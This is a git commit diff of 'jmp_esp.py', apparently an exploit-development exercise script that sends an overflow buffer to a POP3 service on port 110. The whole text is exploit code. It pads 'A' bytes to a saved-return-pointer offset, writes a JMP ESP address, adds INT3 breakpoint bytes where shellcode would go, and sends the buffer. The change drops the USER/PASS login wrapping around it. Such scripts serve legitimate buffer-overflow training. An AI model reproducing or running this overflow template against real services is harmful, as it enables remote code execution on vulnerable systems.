e39fef4f59264c37b3a7293eda3dbdf0b9d4442b
Mitch Lacy <mrlacy@uwm.edu>
2018-08-28 18:43:51 -0700

    Update jmp_esp.py

--- jmp_esp.py
+++ jmp_esp.py
@@ -5,7 +5,7 @@ RPORT = 110
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.connect((RHOST, RPORT))
-s.recv(1024)
+
  
 buf_totlen = 2700 #get this from fuzzing
 offset_srp = 2606 #get this from pattern_offset
@@ -16,8 +16,5 @@ buf = ''
 buf += 'A'*(offset_srp-len(buf))
 buf += struct.pack("<I", ptr_jmp_esp)
 buf += "\xCC\xCC\xCC\xCC"
-buf += "D"*(buf_totlen-len(buf))
-
-s.send('USER username' +'\r\n')
-s.recv(1024)  
-s.send('PASS ' + buf + '\r\n') 
+buf += "D"*(buf_totlen-len(buf))  
+s.send(buf + '\n') 
